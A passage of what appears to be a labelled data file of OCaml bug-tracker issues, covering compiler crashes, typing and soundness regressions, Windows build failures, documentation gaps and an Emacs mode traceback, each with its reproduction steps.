avoid\nchanging the value of an existing data structure.\nThus I should have done\n   myMutStr <- String.copy \"11\";\ninstead of\n   myMutStr <- \"11\";\n\nThis is all very obvious if you remember to think in terms of pointers.\nSorry to bother you\n\nLee\n"},{"labels":["bug"],"text":"**Original bug ID:** 1462\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHi\n\nI'm trying to compile with the native windows port (3.06), and bytecode *compiling* seems fine, but both linking bytecode and native compiling ocamlopt give the same error:\n\nocamlopt -c -thread -I +lablgtk -I /cygdrive/d/Frank/lib  rnd.ml\nFatal error: exception Invalid_argument(\"Filename.temp_file: temp dir nonexisten\nt or full\")\nmake: *** [rnd.cmx] Error 2\n\nThe code compiles and runs fine under Linux.\n\nThis is on Windows XP, and I just did the standard install plus lablgtk, as in the instructions. Any clue how to remedy this ?\n\nCheers\nFrank Dellaert\n\n----------------\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">\n<HTML><HEAD>\n<META http-equiv=Content-Type content=\"text/html; charset=iso-8859-1\">\n<META content=\"MSHTML 6.00.2800.1106\" name=GENERATOR>\n<STYLE></STYLE>\n</HEAD>\n<BODY bgColor=#ffffff>\n<DIV><FONT face=Arial size=2>Hi</FONT></DIV>\n<DIV><FONT face=Arial size=2></FONT>&nbsp;</DIV>\n<DIV><FONT face=Arial size=2>I'm trying to compile with the native windows port \n(3.06), and bytecode *compiling* seems fine, but both linking bytecode and \nnative compiling ocamlopt give the same error:</FONT></DIV>\n<DIV><FONT face=Arial size=2></FONT>&nbsp;</DIV>\n<DIV><FONT face=Arial size=2>ocamlopt -c -thread -I +lablgtk -I \n/cygdrive/d/Frank/lib&nbsp; rnd.ml<BR>Fatal error: exception \nInvalid_argument(\"Filename.temp_file: temp dir nonexisten<BR>t or \nfull\")<BR>make: *** [rnd.cmx] Error 2</FONT></DIV>\n<DIV><FONT face=Arial size=2></FONT>&nbsp;</DIV>\n<DIV><FONT face=Arial size=2>The code compiles and runs fine under \nLinux.</FONT></DIV>\n<DIV><FONT face=Arial size=2></FONT>&nbsp;</DIV>\n<DIV><FONT face=Arial size=2>This is on Windows XP, and I just did the standard \ninstall plus lablgtk, as in the instructions. Any clue how to remedy this \n?</FONT></DIV>\n<DIV><FONT face=Arial size=2></FONT>&nbsp;</DIV>\n<DIV><FONT face=Arial size=2>Cheers<BR>Frank \nDellaert<BR></FONT></DIV></BODY></HTML>\n\n----------------\n----------------\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7870\n**Reporter:** @damiendoligez\n**Assigned to:** @damiendoligez\n**Status:** assigned (set by @damiendoligez on 2018-11-05T14:49:28Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.08.0+dev/beta1/beta2\n**Category:** documentation\n**Monitored by:** @nojb\n\n## Bug description\n\nThe following letters are used for parameters in OCAMLRUNPARAM but not documented in ocamlrun.m:\r\nc, H, t, w, W\r\n\r\nThe following are not documented in runtime.etex:\r\nH, t, w, W\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7868\n**Reporter:** skaller\n**Assigned to:** @gasche\n**Status:** resolved (set by @alainfrisch on 2018-10-26T13:30:36Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.07.1\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** documentation\n**Monitored by:** @nojb\n\n## Bug description\n\nThe docs say Set.diff is \"set difference\".\r\n\r\nAs I pointed out years ago (why isn't this fixed!!) there are TWO operations called set difference. Both should be provided IMHO but at least the one that is provided should be properly specified.\r\n\r\nIs this (a) the symmetric difference, equal to the union with the intersection removed, OR is it (b) the asymmetric difference, the elements of the first set with those of the second which are in it removed?\n\n## Steps to reproduce\n\nJust read the docs.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7867\n**Reporter:** ggole\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2018-10-27T15:32:49Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Version:** 4.06.1\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** toplevel\n**Monitored by:** @nojb @gasche\n\n## Bug description\n\nWhen #mod_use is used with an argument that names a file that exists, and the name has no extension, the toplevel will die with an exception:\r\n\r\n  Fatal error: exception Invalid_argument(\"Filename.chop_extension\")\r\n\r\nNote that this does not happen if the named file does not exist.\n\n## Steps to reproduce\n\n$ touch wat\r\n$ ocaml\r\n        OCaml version 4.06.1\r\n\r\n# #mod_use \"wat\";;\r\nFatal error: exception Invalid_argument(\"Filename.chop_extension\")\r\n$\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7865\n**Reporter:** slindley\n**Assigned to:** @trefis\n**Status:** assigned (set by @trefis on 2018-10-22T13:04:17Z)\n**Resolution:** open\n**Priority:** high\n**Severity:** major\n**Version:** 4.07.0\n**Category:** typing\n**Monitored by:** @nojb @hcarty\n\n## Bug description\n\nAttempting to compile the following code\r\n\r\n```\r\nclass c =\r\nobject (o)\r\n  method foo = o\r\nend\r\n\r\nclass d =\r\nobject (o) inherit c\r\n  method bar = fun () ->\r\n    let o = List.fold_right (fun _ o -> o#foo) [] o in\r\n    let o = match [] with | [] -> o in o\r\nend\r\n```\r\n\r\nleads to the error\r\n\r\n```\r\nFile \"bug.ml\", line 10, characters 34-35:\r\nError: This expression has type < bar : unit -> 'b; foo : 'a; .. > as 'a\r\n       but an expression was expected of type 'c\r\n       Self type cannot escape its class\r\n```\r\n\r\nThe problem can be worked around by adding type annotations:\r\n\r\n```\r\nclass d =\r\nobject (o : 'self) inherit c\r\n  method bar = fun () ->\r\n    let o = List.fold_right (fun _ o -> o#foo) [] o in\r\n    let (o : 'self) = match [] with | [] -> o in o\r\nend\r\n```\n\n## Additional information\n\nIn the context of a much larger program (the Links web programming language), we managed to make the compiler crash (even with the type annotation) by invoking another method in the body of the match:\r\n\r\n  https://github.com/links-lang/links/issues/407\r\n\r\nIt probably wouldn't be too hard to generate a small example for that bug too, but I'm hopeful that fixing the initial typing problem may also fix the compiler crash.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7864\n**Reporter:** ggole\n**Assigned to:** @nojb\n**Status:** resolved (set by @nojb on 2018-11-05T12:25:46Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** trivial\n**Version:** 4.06.1\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** toplevel\n**Monitored by:** @nojb\n\n## Bug description\n\nWhen the same name is defined at top level and in opened modules, spelling suggestions will list that name, unqualified, multiple times. The result is slightly ridiculous:\r\n\r\n  Hint: Did you mean foo, foo or foo?\n\n## Steps to reproduce\n\nDefine the same name in several modules and open them. Then misspell that identifier such that spelling suggestions are made.\r\n\r\n        OCaml version 4.06.1\r\n\r\n# module A = struct let foo = () end;;\r\nmodule A : sig val foo : unit end\r\n# module B = struct let foo = () end;;\r\nmodule B : sig val foo : unit end\r\n# open A;;\r\n# open B;;\r\n# let foo = ();;\r\nval foo : unit = ()\r\n# fop;;\r\nCharacters 0-3:\r\n  fop;;\r\n  ^^^\r\nError: Unbound value fop\r\nHint: Did you mean foo, foo or foo?\r\n#\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7863\n**Reporter:** @ivg\n**Assigned to:** @lpw25\n**Status:** resolved (set by @lpw25 on 2018-10-16T19:45:34Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.05.0\n**Category:** typing\n**Monitored by:** @nojb @yallop\n\n## Bug description\n\nNote, this issue is reproducible on 4.05 and 4.07 (and probably other versions that I didn't try), but I will showcase using 4.07 since refutation cases provide a nice illustration of the problem. \r\n\r\nThe unusual thing is that the type checker (or irrefutability checker) depends on the values and the scope of data constructors when it reasons about the possibility of equality of two types. For example, the following code:\r\n\r\n```\r\nmodule Type = struct\r\n  type 'a value = T1\r\n  type 'a eff = T1\r\nend\r\nopen Type\r\n\r\n\r\ntype 'a s = Newtype\r\n\r\ntype _ term =\r\n  | Val : 'a value s -> 'a value term\r\n  | Eff : 'a eff s  -> 'a eff term\r\n\r\ntype 'a t = 'a term\r\n\r\nlet sort : type a. a value t -> unit =\r\n  fun x -> match x with\r\n    | Val x -> ()\r\n    | _ -> .\r\n```\r\n\r\nDoesn't type check with an error:\r\n\r\n```\r\nError: This match case could not be refuted.\r\n       Here is an example of a value that would reach it: Eff Newtype\r\n```\r\n\r\nEven if we will put `'a value` and `'a eff` type definitions into different modules, but leave the data constructors names the same, we will still have the same problem. \r\n\r\nHowever, if we will give different names to their corresponding data constructors, e.g.,\r\n\r\n```\r\nmodule Type = struct\r\n  type 'a value = T1\r\n  type 'a eff = T2\r\nend\r\nopen Type\r\n\r\n\r\ntype 'a s = Newtype\r\n\r\ntype _ term =\r\n  | Val : 'a value s -> 'a value term\r\n  | Eff : 'a eff s  -> 'a eff term\r\n\r\ntype 'a t = 'a term\r\n\r\nlet sort : type a. a value t -> unit =\r\n  fun x -> match x with\r\n    | Val x -> ()\r\n    | _ -> .\r\n```\r\n\r\nthe refutability check passes. \r\n\r\nAnother interesting observation is that if we will put the definitions of our phantom types to the toplevel, the refutability check suddenly passes even with equal data constructors, e.g.,\r\n\r\n```\r\ntype 'a value = T1\r\ntype 'a eff = T1\r\n\r\n\r\ntype 'a s = Newtype\r\n\r\ntype _ term =\r\n  | Val : 'a value s -> 'a value term\r\n  | Eff : 'a eff s  -> 'a eff term\r\n\r\ntype 'a t = 'a term\r\n\r\nlet sort : type a. a value t -> unit =\r\n  fun x -> match x with\r\n    | Val x -> ()\r\n    | _ -> .\r\n```\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7861\n**Reporter:** freyr\n**Assigned to:** @lpw25\n**Status:** resolved (set by @lpw25 on 2018-10-22T08:08:23Z)\n**Resolution:** not a bug\n**Priority:** high\n**Severity:** minor\n**Platform:** x86_64\n**OS:** linux\n**OS Version:** 4.18.11-arch1-1\n**Version:** 4.07.1\n**Category:** middle end (typedtree to clambda)\n**Monitored by:** @nojb\n\n## Bug description\n\nFor some reason GC collects react events borrowed in Lwt_react.E.select. Lwt_react in flambda build.E.keep or saving event in some variable or reference does not help either. Without flambda GC does not collect values it seems.\n\n## Steps to reproduce\n\nA trivial example is attached. With flambda switch `Lwt_react.E.with_finaliser` functions print, without flambda they do not.\n\n## File attachments\n\n- [gc.tar.gz](https://gist.githubusercontent.com/vicuna/57f90abd9448660a1b372b83db91091d/raw/8cd58ad3164f1fff3143474af027f93dd6acbaac/gc.tar.gz)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7858\n**Reporter:** @gasche\n**Assigned to:** @let-def\n**Status:** assigned (set by @gasche on 2018-10-03T13:14:59Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.08.0+dev/beta1/beta2\n**Target version:** undecided\n**Category:** lexing and parsing\n**Tags:** syntax-error-messages\n**Monitored by:** @nojb\n\n## Bug description\n\nConsider the input \"(foo,);;\"\r\n\r\n\r\n4.07.0 behaves as follows:\r\n\r\n    # (foo,);;\r\n           ^\r\n    Error: Syntax error: operator expected.\r\n\r\n\r\nTrunk (4.08+dev) behaves as follows:\r\n\r\n    # (foo,);;\r\n           ^\r\n    Error: Syntax error: ')' expected\r\n    Line 1, characters 0-1: This '(' might be unmatched\r\n\r\nBoth messages are bad, but arguably the new one is even worse.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1461\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Dr. Lee Hunt McDonald\nVersion: OCaml 3.02 and 3.06\nOS: RedHat 8.0 Linux\nSubmission from: dsl093-162-077.tus1.dsl.speakeasy.net (66.93.162.77)\n\n\nI ran the following code with OCaml 3.02 (CDK) and OCaml 3.06.\nThe output shows that there is a bug here.\n\n\n---------- start code -------------\n(* BAD.ML : string bug *)\n\nclass bad =\nobject\n(* ---- instance variables ---- *)\n  val mutable myMutStr = \"11\";\n\n\n (* ---- setters ---- *)\n  method chgStr : unit = \n  begin\n    myMutStr.[0] <- '2';\n    myMutStr.[1] <- '2';\n  end;\n\n\n  method backStr : unit = myMutStr <- \"11\";\n\n\n (* ---- getters ---- *)\n  method getStr : string =\n  begin\n    myMutStr;\n  end;\nend (* end class bad *)\n\n\n(*\n * -------- functional stuff for unit testing --------\n *)\nlet _ =\n  if !(Sys.interactive) then\n    ()\n  else begin\n    print_string \"Bad behavior v0.00\";\n    print_newline ();\n    let jj = new bad\n    in begin\n      jj#chgStr;\n      jj#backStr;\n      let x1 = jj#getStr\n      in begin\n        print_string (\"1st =\" ^ x1);\n        print_newline ();\n      end;\n      jj#chgStr;\n      jj#backStr;\n      let x1 = jj#getStr\n      in begin\n        print_string (\"2nd =\" ^ x1);\n        print_newline ();\n      end;\n    end;\n  end (* end else *)\n----------- end code ---------------\n----------- start shell script : this is how I compiled bad.exe -----------\n#!/bin/sh\nocamlc -g -c bad.ml\nocamlc -g -o bad.exe bad.cmo\n---------- end shell script ----------\n----------- start output (from running bad.exe) -----------\nBad behavior v0.00\n1st =11\n2nd =22\n----------- end output -----------\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7854\n**Reporter:** turpin\n**Assigned to:** @nojb\n**Status:** resolved (set by @nojb on 2018-12-02T15:10:44Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** Windows MSVC\n**OS:** Windows MSVC\n**OS Version:** Windows 10\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** platform support (windows, cross-compilation, etc)\n\n## Bug description\n\nI believe that, for the intended backward-compatibility purpose, CP_ACP is more appropriate than CP_THREAD_ACP. The former (System active code page) is the one used by the ANSI version of the Windows API functions. I think the latter is more related to user language settings.\n\n## Steps to reproduce\n\nDifference between CP_THREAD_ACP and CP_ACP was observed on a japanese Windows 10 host (shift_js) with french as use language setting.\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7852\r\n**Reporter:** @trefis\r\n**Assigned to:** @trefis\r\n**Status:** assigned (set by @trefis on 2018-09-21T16:46:49Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.08.0+dev/beta1/beta2\r\n**Category:** typing\r\n**Monitored by:** @nojb @hhugo @Drup\r\n\r\n## Bug description\r\n\r\nThis regression was introduced by https://github.com/ocaml/ocaml/pull/1737\r\n\r\nI'll try to fix it without having to revert the GPR.\r\nBut if I fail, we can always revert it, it's not that important.\r\n\r\n## Steps to reproduce\r\n\r\n```\r\n$ cat test.mli\r\nmodule M : sig\r\n  type t\r\n  val foo : t -> int\r\n  val bar : t -> int\r\nend\r\n\r\nmodule N : sig\r\n  type outer\r\n  type t\r\n  val foo : t -> outer\r\n  val bar : t -> outer\r\nend with type outer := int\r\n$ ./ocamlc.opt -w +32 -c ./test.mli\r\nFile \"./test.mli\", line 10, characters 2-22:\r\nWarning 32: unused value foo.\r\nFile \"./test.mli\", line 11, characters 2-22:\r\nWarning 32: unused value bar.\r\n$ $HOME/.opam/4.07.0/bin/ocamlc -w +32 -c ./test.mli\r\n$\r\n```"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7851\n**Reporter:** @garrigue\n**Assigned to:** @garrigue\n**Status:** assigned (set by @garrigue on 2018-09-20T06:37:44Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.07.0\n**Target version:** 4.08.0+dev/beta1/beta2\n**Category:** typing\n**Monitored by:** @nojb @gasche @yallop @Yakobowski\n\n## Bug description\n\nBy removing some equations from the type of a module (using nondep_subtyping for instance), one can make it malformed. Then by further abstracting in with \"module type of\", and instantiating with \"with type\", it is possible to break soundness.\r\n\r\nDiscovered during https://github.com/ocaml/ocaml/pull/2051\n\n## Steps to reproduce\n\ntype (_,_) eq = Eq : ('a,'a) eq\r\nmodule F(X : Set.OrderedType) = struct\r\n  type x = Set.Make(X).t and y = Set.Make(X).t\r\n  type t = E of (x,x) eq\r\n  type u = t = E of (x,y) eq\r\nend;;\r\nmodule M = F(struct type t let compare = compare end);;\r\nmodule type S = module type of M;;\r\nmodule rec M1 : S with type x = int and type y = bool = M1;;\r\nlet (E eq : M1.u) = (E Eq : M1.t);;\r\nlet cast : type a b. (a,b) eq -> a -> b = fun Eq x -> x;;\r\ncast eq 3;;\r\n- : M1.y = <unknown constructor>\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7849\n**Reporter:** Eugene\n**Status:** confirmed (set by @gasche on 2018-09-15T21:36:12Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** tweak\n**Version:** 4.07.0\n**Category:** middle end (typedtree to clambda)\n\n## Bug description\n\nHere is the code: https://pastebin.com/TfVzyzgC\r\nIf compiled with 4.05.0+flambda, it basically optimizes long (>>=) and `map` chain away.\r\nOn 4.07.0, however, it runs much longer and binary is bigger.\n\n## Steps to reproduce\n\n$ ~/.opam/4.05.0+flambda/bin/ocamlopt t.ml -o test_05 -O3\r\n$ ~/.opam/4.07.0+flambda/bin/ocamlopt t.ml -o test_07 -O3\r\n$ time ./test_05\r\n5000000100000000\r\n\r\nreal\t0m0.170s\r\nuser\t0m0.170s\r\nsys\t0m0.000s\r\n$ time ./test_07\r\n5000000100000000\r\n\r\nreal\t0m1.293s\r\nuser\t0m1.289s\r\nsys\t0m0.004s\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7847\n**Reporter:** smuenzel-js\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2018-09-06T08:18:14Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.07.0\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** lexing and parsing\n**Monitored by:** smuenzel-js @nojb @hhugo @gasche\n\n## Bug description\n\nThe following code results in a hang (in Parse.ml, around line 109):\r\n\r\nexternal x : unit -> (int,int)`A.t = \"x\"\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7846\n**Reporter:** smuenzel-js\n**Assigned to:** @nojb\n**Status:** resolved (set by @nojb on 2018-09-04T04:42:01Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.07.0\n**Target version:** 4.08.0+dev/beta1/beta2\n**Category:** back end (clambda to assembly)\n**Duplicate of:** #7408\n**Monitored by:** @nojb @gasche\n\n## Bug description\n\nexternal cmp : 'a -> 'nt = \"%compare\";;\r\nlet nativeint_cmp (x : nativeint) y = cmp x y;;\r\n\r\n\r\nFile \"/tmp/a.ml\", line 4, characters 44-45:\r\nWarning 20: this argument will not be used by the function.\r\nFatal error: exception File \"asmcomp/cmmgen.ml\", line 1983, characters 15-21: Assertion failed\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7845\r\n**Reporter:** @bryphe\r\n**Assigned to:** @dra27\r\n**Status:** assigned (set by @dra27 on 2018-09-01T08:03:24Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** major\r\n**Platform:** Windows + Cygwin\r\n**OS:** Windows\r\n**OS Version:** 10\r\n**Version:** 4.07.0\r\n**Category:** configure and build/install\r\n**Monitored by:** @nojb @hcarty\r\n\r\n## Bug description\r\n\r\nBuilds of the OCaml compiler have started to fail for me today, with errors of the form:\r\n```\r\nOCAML_FLEXLINK=\"../boot/ocamlrun ../flexdll/flexlink.exe\" ../runtime/ocamlrun ../ocamlc -g -nostdlib -I ../utils -I ../p\r\narsing -I ../stdlib -I ../compilerlibs -strict-sequence -safe-string -strict-formats -w +a-4-9-41-42-44-45-48 -warn-erro\r\nr A -custom ocamlcommon.cma -o ocamltest.exe run_win32.o run_stubs.o ocamltest_stdlib_stubs.o ocamltest_config.cmo ocaml\r\ntest_stdlib.cmo run_command.cmo filecompare.cmo variables.cmo environments.cmo result.cmo actions.cmo tests.cmo tsl_ast.\r\ncmo tsl_parser.cmo tsl_lexer.cmo tsl_semantics.cmo builtin_variables.cmo actions_helpers.cmo builtin_actions.cmo ocaml_b\r\nackends.cmo ocaml_filetypes.cmo ocaml_variables.cmo ocaml_modifiers.cmo ocaml_directories.cmo ocaml_files.cmo ocaml_flag\r\ns.cmo ocaml_commands.cmo ocaml_tools.cmo ocaml_compilers.cmo ocaml_toplevels.cmo ocaml_actions.cmo ocaml_tests.cmo optio\r\nns.cmo main.cmo                                                                                                         \r\nx86_64-w64-mingw32-gcc: error: ../stdlib\\libcamlrun.a: No such file or directory                                        \r\n** Fatal error: Error during linking                                                                                    \r\n```\r\n\r\nBefore today, builds were working great in our Cygwin environment!\r\n\r\nAfter some investigation, I narrowed it down to the recent Cygwin release - the cygwin dll was updated to 2.11.0 today (8/31). On an environment with the 2.10.0 version, the build is successful, but on an environment with the 2.11.0 version, the build fails with the above error.\r\n\r\nA full build failure is available here:\r\nhttps://gist.github.com/bryphe/58603ab752ecd988f78ee383fa9c9e78\r\n\r\n## Steps to reproduce\r\n\r\nThe failure is reproducible by following the MingW build steps here: https://github.com/ocaml/ocaml/blob/trunk/README.win32.adoc\r\n, if you have the latest Cygwin environment. You can validate that you have the latest environment by checking `cygcheck -c` and looking for the cygwin version - if it is 2.11.0, it should repro.\r\n\r\nAlternatively, if you have NPM, you can follow these steps to repro:\r\n- `npm install -g esy-bash@0.1.22`\r\n- `git clone https://github.com/ocaml/ocaml`\r\n- `cd ocaml`\r\n- `git submodule update --init`\r\n- `cp config/m-nt.h runtime/caml/m.h`\r\n- `cp config/s-nt.h runtime/caml/s.h`\r\n- `cp config/Makefile.mingw64 config/Makefile`\r\n- `esy-bash make flexdll`\r\n- `esy-bash make world.opt`\r\n- `esy-bash make flexlink.opt`\r\n- `esy-bash make install`\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7844\n**Reporter:** wilfred\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2018-09-13T12:57:59Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** emacs mode\n**Has duplicate:** #7689\n**Monitored by:** wyuenho @nojb @gasche\n\n## Bug description\n\nimenu in Emacs crashes when a comment contains the word 'in'. This also affects tuareg-mode.\n\n## Steps to reproduce\n\nCreate an ocaml buffer with the following contents:\r\n\r\n?(**\r\n * in \r\n *)\r\n\r\nAnd run M-x imenu.\r\n\r\nTraceback produced:\r\n\r\nDebugger entered--Lisp error: (wrong-type-argument integer-or-marker-p nil)\r\n  buffer-substring-no-properties(nil nil)\r\n  (if string (substring string begin end) (buffer-substring-no-properties begin end))\r\n  (let* ((data (match-data)) (begin (nth (* 2 num) data)) (end (nth (1+ (* 2 num)) data))) (if string (substring string begin end) (buffer-substring-no-properties begin end)))\r\n  caml-match-string(5)\r\n  (cons (caml-match-string 5) (point))\r\n  (setq index (cons (caml-match-string 5) (point)))\r\n  (while (caml-prev-index-position-function) (setq index (cons (caml-match-string 5) (point))) \"Macro to display a progress message.\\nRELPOS is the relative position to display.\\nIf RELPOS is nil, then the relative position in the buffer\\nis calculated.\\nPREVPOS is the variable in which we store the last position displayed.\" (setq all-alist (cons index all-alist)) (cond ((looking-at \"[ \\011]*and\") (setq and-alist (cons index and-alist))) ((looking-at \"[ \\011]*let\") (setq value-alist (cons index (append and-alist value-alist))) (setq and-alist nil)) ((looking-at \"[ \\011]*type\") (setq type-alist (cons index (append and-alist type-alist))) (setq and-alist nil)) ((looking-at \"[ \\011]*class\") (setq class-alist (cons index (append and-alist class-alist))) (setq and-alist nil)) ((looking-at \"[ \\011]*val\") (setq value-alist (cons index value-alist))) ((looking-at \"[ \\011]*\\\\(module\\\\|functor\\\\)\") (setq module-alist (cons index module-alist))) ((looking-at \"[ \\011]*method\") (setq method-alist (cons index method-alist)))))\r\n  (let (value-alist type-alist class-alist method-alist module-alist and-alist all-alist menu-alist (prev-pos (point-max)) index) (goto-char prev-pos) \"Macro to display a progress message.\\nRELPOS is the relative position to display.\\nIf RELPOS is nil, then the relative position in the buffer\\nis calculated.\\nPREVPOS is the variable in which we store the last position displayed.\" (while (caml-prev-index-position-function) (setq index (cons (caml-match-string 5) (point))) \"Macro to display a progress message.\\nRELPOS is the relative position to display.\\nIf RELPOS is nil, then the relative position in the buffer\\nis calculated.\\nPREVPOS is the variable in which we store the last position displayed.\" (setq all-alist (cons index all-alist)) (cond ((looking-at \"[ \\011]*and\") (setq and-alist (cons index and-alist))) ((looking-at \"[ \\011]*let\") (setq value-alist (cons index (append and-alist value-alist))) (setq and-alist nil)) ((looking-at \"[ \\011]*type\") (setq type-alist (cons index (append and-alist type-alist))) (setq and-alist nil)) ((looking-at \"[ \\011]*class\") (setq class-alist (cons index (append and-alist class-alist))) (setq and-alist nil)) ((looking-at \"[ \\011]*val\") (setq value-alist (cons index value-alist))) ((looking-at \"[ \\011]*\\\\(module\\\\|functor\\\\)\") (setq module-alist (cons index module-alist))) ((looking-at \"[ \\011]*method\") (setq method-alist (cons index method-alist))))) (mapc (function (lambda (pair) (if (symbol-value (cdr pair)) (setq menu-alist (cons (cons (car pair) (sort (symbol-value (cdr pair)) 'imenu--sort-by-name)) menu-alist))))) '((\"Values\" . value-alist) (\"Types\" . type-alist) (\"Modules\" . module-alist) (\"Methods\" . method-alist) (\"Classes\" . class-alist))) (if all-alist (setq menu-alist (cons (cons \"Index\" all-alist) menu-alist))) \"Macro to display a progress message.\\nRELPOS is the relative position to display.\\nIf RELPOS is nil, then the relative position in the buffer\\nis calculated.\\nPREVPOS is the variable in which we store the last position displayed.\" menu-alist)\r\n  tuareg-imenu-create-index()\r\n  imenu--make-index-alist()\r\n  imenu-choose-buffer-index()\r\n  byte-code(\"\\300 C\\207\" [imenu-choose-buffer-index] 1)\r\n  call-interactively(imenu record nil)\r\n  command-execute(imenu record)\r\n\r\nNote that tuareg-imenu-create-index is an alias for caml-create-index-function.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7843\n**Reporter:** matt\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2018-09-02T17:12:04Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** na\n**OS:** na\n**OS Version:** na\n**Version:** 4.07.0\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** ocamldoc\n**Monitored by:** @nojb\n\n## Bug description\n\nExample:\r\n\r\n24.13 Module Format : Pretty-printing.\r\nThis module implements a pretty-printing facility to format values within [24.13] and [24.13] com-\r\nbined with a set of [24.13]. The pretty-printer splits lines at specified [24.13], and indents lines\r\naccording to the box structure. Similarly, [24.13] can be used to decouple text presentation from\r\nits contents.\r\n\r\nI did not investigate more than that: opened this ticket to not forget the problem.\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7842\n**Reporter:** @ejgallego\n**Assigned to:** @chambart\n**Status:** assigned (set by @chambart on 2018-08-31T23:34:23Z)\n**Resolution:** open\n**Priority:** low\n**Severity:** minor\n**Platform:** Linux\n**OS:** Ubuntu\n**OS Version:** 18.04\n**Version:** 4.07.0\n**Category:** middle end (typedtree to clambda)\n\n## Bug description\n\nDear OCaml devs, Jason Gross has reported a case where flambda-enabled ocamlopt stacks overflow whereas the normal version compiles fine.\r\n\r\nIncreasing the stack limit solves the issue, so I am unsure if you would even consider this a bug, but reporting anyways.\r\n\r\nOriginal Coq issue: https://github.com/coq/coq/pull/8313\n\n## Steps to reproduce\n\nDownload the file: https://github.com/coq/coq/files/2328849/unsaturated_solinas.tar.gz\r\n\r\nThen compile with 4.07.0+flambda. The stack trace is:\r\n\r\n> Fatal error: exception Stack overflow\r\n> Raised by primitive operation at file \"middle_end/flambda_iterators.ml\", line 739, characters 25-38\r\n> Called from file \"middle_end/flambda_iterators.ml\", line 739, characters 25-38\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7841\n**Reporter:** @dra27\n**Assigned to:** @diml\n**Status:** assigned (set by @dra27 on 2018-08-22T14:35:19Z)\n**Resolution:** open\n**Priority:** high\n**Severity:** minor\n**Platform:** any\n**OS:** n/a\n**OS Version:** n/a\n**Version:** 4.07.0\n**Target version:** 4.08.0+dev/beta1/beta2\n**Category:** toplevel\n**Monitored by:** @nojb\n\n## Bug description\n\nShadowing standard library modules doesn't work in the toplevel, in particular the new Result module merged in 4.08 shadows the opam result package's Result module.\n\n## Steps to reproduce\n\n- Build and compile ocaml-trunk and the https://github.com/janestreet/result\r\n - Launch the toplevel\r\n - #directory \"/path/to/result.cma\";;\r\n - #load \"result.cma\";;\r\n - #show_module Result;;\r\n\r\nThe result should be a module with a single type, but the standard library's Result module will be shown instead.\n\n## Additional information\n\nSee comments at the end of #1956 (https://github.com/ocaml/ocaml/pull/1956#issuecomment-414989280)\n"},{"labels":["bug"],"text":"**Original bug ID:** 1459\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nLes prototype d'alloc_string dans alloc.h est\nCAMLextern value alloc_string (mlsize_t);\n\nOr il me semblait que les tailles en octets etaient plutot designees\npar asize_t, comme dans stat_alloc.\nSi mlsize_t ne suppose pas une taille en mots, il faudrait au moins un\ncommentaire le disant.\n\n            Jacques\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7838\n**Reporter:** @mmottl\n**Assigned to:** @garrigue\n**Status:** resolved (set by @trefis on 2018-08-29T10:01:58Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.07.0\n**Category:** typing\n**Monitored by:** @nojb @gasche @mmottl\n\n## Bug description\n\nConsider the following code in file 